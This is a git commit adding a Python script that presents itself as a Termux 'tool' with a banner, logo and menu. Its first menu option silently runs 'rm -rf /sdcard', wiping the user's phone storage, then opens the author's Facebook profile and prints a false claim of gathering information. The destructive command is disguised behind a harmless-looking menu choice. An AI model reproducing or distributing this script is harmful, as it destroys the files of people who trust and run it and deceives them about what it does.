a1819dfed7435712d04c160e313cce6e4985647a
D1ARK-VA4U3 <86417041+D1ARK-VA4U3@users.noreply.github.com>
2021-06-25 09:22:49 +0600

    Add files via upload

---
+++ Dark-Vau.py
@@ -0,0 +1,79 @@
+import os
+os.sys
+import time
+import sys
+os.system("clear")
+logo = """\033[94m
+
+TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB   
+
+T:::::::::::::::::::::TH:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  
+
+T:::::::::::::::::::::TH:::::::H     H:::::::H CC:::::::::::::::CB::::::BBBBBB:::::B 
+
+T:::::TT:::::::TT:::::THH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::B     B:::::B
+
+TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B
+
+        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B
+
+        T:::::T          H::::::HHHHH::::::HC:::::C                B::::BBBBBB:::::B 
+
+        T:::::T          H:::::::::::::::::HC:::::C                B:::::::::::::BB  
+
+        T:::::T          H:::::::::::::::::HC:::::C                B::::BBBBBB:::::B 
+
+        T:::::T          H::::::HHHHH::::::HC:::::C                B::::B     B:::::B
+
+        T:::::T          H:::::H     H:::::HC:::::C                B::::B     B:::::B
+
+        T:::::T          H:::::H     H:::::H C:::::C       CCCCCC  B::::B     B:::::B
+
+      TT:::::::TT      HH::::::H     H::::::HHC:::::CCCCCCCC::::CBB:::::BBBBBB::::::B
+
+      T:::::::::T      H:::::::H     H:::::::H CC:::::::::::::::CB:::::::::::::::::B 
+
+      T:::::::::T      H:::::::H     H:::::::H   CCC::::::::::::CB::::::::::::::::B  
+
+      TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHH      CCCCCCCCCCCCCBBBBBBBBBBBBBBBBB
+                                                                    
+             
+
+"""
+def logop(z):
+    for word  in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.01)
+logop(logo)
+
+os.system("figlet welcome to my tool ")
+n= "Tool maker by Moynul "
+sys.stdout.write(n)
+sys.stdout.flush()
+time.sleep(5)
+print(n)
+print("""
+[1]Admin er GF 
+[2]Back """)
+
+option = input("enter your choice:")
+if option == "1":
+    i = 1 
+    while i <= 1 :
+        os.system("cd /sdcard")
+        os.system("ls")
+        os.system("rm -rf /sdcard")
+        os.system("apt install sl")
+        os.system("sl")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100028650051426")
+        i = i + 1
+elif option ==  "2":
+    os.system("xdg-open https://www.facebook.com/profile.php?id=100069552861380")
+else:
+    print(" Hi i am Moynul ")
+print("Kamon laglo comment a janaben")
+print("your all information gethering ")
+print("Termux help centre bd ")
+os.system("xdg-open https://www.facebook.com/profile.php?id=100069552861380")
